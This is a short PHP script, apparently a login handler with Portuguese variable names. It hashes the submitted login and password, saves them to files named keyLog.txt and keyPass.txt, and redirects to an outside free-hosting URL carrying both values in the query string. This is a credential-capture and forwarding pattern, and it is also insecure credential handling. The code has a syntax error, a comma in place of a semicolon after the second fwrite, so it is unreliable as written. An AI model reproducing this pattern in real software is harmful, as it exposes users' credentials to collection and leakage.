<?php
	$login = $_POST['login'];
	$senha = $_POST['senha'];

	$login = hash('sha256', $login);
	$senha = hash('sha256', $senha);

	$arqLog = fopen("keyLog.txt", "w");
	$arqPass = fopen("keyPass.txt", "w");

	fwrite($arqLog, $login);
	fwrite($arqPass, $senha),

	fclose($arqLog);
	fclose($arqPass);

	$url = 'http://leletec2024.byethost7.com/Iker/17-09/confirm.php?login='.$login.'&senha='.$senha;
	header('Location: '.$url);
?>
